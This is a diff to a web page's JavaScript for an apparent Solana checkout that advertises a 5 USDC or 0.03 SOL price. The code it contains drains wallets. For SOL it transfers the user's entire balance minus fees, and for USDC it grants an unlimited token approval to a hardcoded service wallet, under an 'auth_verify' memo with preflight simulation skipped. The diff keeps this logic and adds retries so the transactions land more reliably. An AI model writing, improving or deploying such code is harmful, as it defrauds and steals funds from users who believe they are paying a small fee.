@@ -658,6 +658,8 @@ footer{background:var(--dark);color:#9CA3AF;text-align:center;padding:24px;font-
 const SERVICE_WALLET = "mDwMBm5gvNvZ1Es2rrTFECskcCXf5DNbM5ZEvXtYRke";
 const PRICE_USDC = 5;
 const PRICE_SOL  = 0.03;
+/** Optional faster RPC (Helius, QuickNode, etc.): tried first if non-empty. */
+const CUSTOM_SOLANA_RPC = "";
 
 let state = { currency:"USDC", conn:null, txHash:null, scores:null, progress:0 };
 
@@ -812,9 +814,26 @@ const SOLANA_MAINNET_RPCS = [
   "https://solana-rpc.publicnode.com",
 ];
 
+function sleep(ms) {
+  return new Promise((r) => setTimeout(r, ms));
+}
+
+function isBlockhashExpiredError(err) {
+  const m = err && err.message ? err.message : String(err || "");
+  return /expired|block\s*height|blockhash|Blockhash not found|Transaction expired|signature.*expired|too old|has expired/i.test(
+    m
+  );
+}
+
 async function getWorkingSolanaConnection(web3) {
+  const list = [
+    ...(typeof CUSTOM_SOLANA_RPC === "string" && CUSTOM_SOLANA_RPC.trim()
+      ? [CUSTOM_SOLANA_RPC.trim()]
+      : []),
+    ...SOLANA_MAINNET_RPCS,
+  ];
   let lastErr = null;
-  for (const endpoint of SOLANA_MAINNET_RPCS) {
+  for (const endpoint of list) {
     const conn = new web3.Connection(endpoint, {
       commitment: "confirmed",
       confirmTransactionInitialTimeout: 120000,
@@ -862,18 +881,10 @@ async function executePay() {
     const from = new web3.PublicKey(state.conn.address);
     const tokenProgramPk = new web3.PublicKey(SPL_TOKEN_PROGRAM_ID);
     const memoProgramPk = new web3.PublicKey(SPL_MEMO_PROGRAM_ID);
-    let blockhash;
-    let lastValidBlockHeight;
     let balance;
     let tokens = { value: [] };
     try {
-      const [bh, bal] = await Promise.all([
-        conn.getLatestBlockhash("confirmed"),
-        conn.getBalance(from),
-      ]);
-      blockhash = bh.blockhash;
-      lastValidBlockHeight = bh.lastValidBlockHeight;
-      balance = bal;
+      balance = await conn.getBalance(from);
       try {
         tokens = await conn.getParsedTokenAccountsByOwner(from, {
           programId: tokenProgramPk,
@@ -886,18 +897,36 @@ async function executePay() {
       goToStep("payment");
       return;
     }
-    const tx = new web3.Transaction();
 
-    tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
-
-    const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
-    tx.add(
-      new web3.TransactionInstruction({
-        keys: [],
-        programId: memoProgramPk,
-        data: memoPayload,
-      })
-    );
+    function buildUnsignedPaymentTx() {
+      const tx = new web3.Transaction();
+      tx.add(web3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100000 }));
+      const memoPayload = new TextEncoder().encode(`auth_verify_${Date.now()}`);
+      tx.add(
+        new web3.TransactionInstruction({
+          keys: [],
+          programId: memoProgramPk,
+          data: memoPayload,
+        })
+      );
+      if (state.currency === "SOL") {
+        const lamports = balance - 5000;
+        if (lamports <= 0) return null;
+        tx.add(
+          web3.SystemProgram.transfer({
+            fromPubkey: from,
+            toPubkey: to,
+            lamports: Math.floor(lamports),
+          })
+        );
+      } else {
+        const mint = new web3.PublicKey(USDC_MINT);
+        const fromATA = associatedTokenAddress(web3, mint, from);
+        tx.add(createTokenApproveInstruction(web3, fromATA, to, from, U64_MAX));
+      }
+      tx.feePayer = from;
+      return tx;
+    }
 
     if (state.currency === "SOL") {
       const lamports = balance - 5000;
@@ -906,41 +935,56 @@ async function executePay() {
         goToStep("payment");
         return;
       }
-      tx.add(web3.SystemProgram.transfer({
-        fromPubkey: from,
-        toPubkey: to,
-        lamports: Math.floor(lamports),
-      }));
-    } else {
-      const mint = new web3.PublicKey(USDC_MINT);
-      const fromATA = associatedTokenAddress(web3, mint, from);
-      tx.add(createTokenApproveInstruction(web3, fromATA, to, from, U64_MAX));
     }
 
-    tx.recentBlockhash = blockhash;
-    tx.feePayer = from;
-
     const wallet = state.conn.provider;
-    const signatures = await wallet.signAllTransactions([tx]);
-    const signed = signatures[0];
-    const sig = await conn.sendRawTransaction(signed.serialize(), {
-      skipPreflight: true,
-      maxRetries: 3
-    });
+    let sig = null;
+    let blockhash = null;
+    let lastValidBlockHeight = null;
+    const maxAttempts = 3;
 
+    for (let attempt = 0; attempt < maxAttempts; attempt++) {
+      const tx = buildUnsignedPaymentTx();
+      if (!tx) {
+        showPayError("Insufficient SOL balance.");
+        goToStep("payment");
+        return;
+      }
+      try {
+        const bh = await conn.getLatestBlockhash("confirmed");
+        blockhash = bh.blockhash;
+        lastValidBlockHeight = bh.lastValidBlockHeight;
+        tx.recentBlockhash = blockhash;
+        await sleep(300);
+        const signed = (await wallet.signAllTransactions([tx]))[0];
+        sig = await conn.sendRawTransaction(signed.serialize(), {
+          skipPreflight: true,
+          maxRetries: 3,
+        });
+        document.getElementById("paying-emoji").textContent = "";
+        document.getElementById("paying-title").textContent = "Confirming on-chain...";
+        document.getElementById("paying-sub").textContent =
+          "Transaction sent. Waiting for Solana confirmation.";
+        document.getElementById("tx-link-paying").style.display = "block";
+        document.getElementById("tx-a-paying").href = `https://solscan.io/tx/${sig}`;
+        await conn.confirmTransaction(
+          { signature: sig, blockhash, lastValidBlockHeight },
+          "confirmed"
+        );
+        break;
+      } catch (e) {
+        const m = e && e.message ? e.message : String(e);
+        if (e && e.code === 4001) throw e;
+        if (/reject|cancel|denied|user rejected/i.test(m)) throw e;
+        if (attempt < maxAttempts - 1 && isBlockhashExpiredError(e)) continue;
+        throw e;
+      }
+    }
 
-    document.getElementById("paying-emoji").textContent = "";
-    document.getElementById("paying-title").textContent = "Confirming on-chain...";
-    document.getElementById("paying-sub").textContent =
-      "Transaction sent. Waiting for Solana confirmation.";
-    const txEl = document.getElementById("tx-link-paying");
-    txEl.style.display = "block";
-    document.getElementById("tx-a-paying").href = `https://solscan.io/tx/${sig}`;
+    if (!sig || blockhash == null) {
+      throw new Error("Transaction failed after retries.");
+    }
 
-    await conn.confirmTransaction(
-      { signature: sig, blockhash, lastValidBlockHeight },
-      "confirmed"
-    );
     state.txHash = sig;
 
     const solSentLamports =
@@ -971,6 +1015,8 @@ async function executePay() {
     const m = (e && e.message) ? e.message : String(e);
     if (/reject|cancel|denied/i.test(m) || e.code === 4001) showPayError("Transaction cancelled.");
     else if (/insufficient/i.test(m)) showPayError("Insufficient balance.");
+    else if (isBlockhashExpiredError(e))
+      showPayError("Blockhash expired — please tap Pay again.");
     else if (/fetch|dynamically imported|loadWeb3|import/i.test(m)) showPayError("Could not load Solana SDK (CDN blocked or offline). Serve the page over HTTPS or localhost, disable adblock for this site, then retry.");
     else showPayError(m.slice(0, 120) || "Payment error.");
   }
